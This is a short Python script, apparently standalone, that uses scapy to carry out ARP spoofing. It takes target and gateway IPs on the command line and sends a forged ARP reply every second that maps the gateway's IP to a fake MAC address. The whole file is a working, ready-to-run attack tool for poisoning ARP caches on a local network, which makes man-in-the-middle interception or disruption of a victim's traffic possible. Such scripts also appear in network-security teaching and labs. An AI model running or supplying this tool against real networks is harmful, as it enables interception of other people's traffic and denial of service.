from scapy.all import ARP, Ether, sendp
import time
import argparse

def main():
    parser = argparse.ArgumentParser(description="ARP Spoofing Attacker Script")
    parser.add_argument("-t", "--target", required=True, help="Target IP (e.g. Victim's IP)")
    parser.add_argument("-g", "--gateway", required=True, help="Gateway IP (e.g. Router IP)")
    parser.add_argument("-m", "--mac", default="de:ad:be:ef:00:01", help="Fake MAC address to spoof")
    args = parser.parse_args()

    TARGET_IP = args.target
    GATEWAY_IP = args.gateway
    FAKE_MAC = args.mac

    # Crafting the malicious ARP reply (op=2)
    # We are telling the Target that the Gateway's IP corresponds to our Fake MAC
    pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(
        op=2,
        pdst=TARGET_IP,
        hwdst="ff:ff:ff:ff:ff:ff", 
        psrc=GATEWAY_IP,
        hwsrc=FAKE_MAC
    )

    print(f"Attacking {TARGET_IP}...")
    print(f"Spoofing Gateway {GATEWAY_IP} with MAC: {FAKE_MAC}...")
    print("Sending forged ARP replies... Press Ctrl+C to stop")

    try:
        while True:
            # sendp sends packets at layer 2
            sendp(pkt, verbose=False)
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[!] Attack stopped.")

if __name__ == "__main__":
    main()
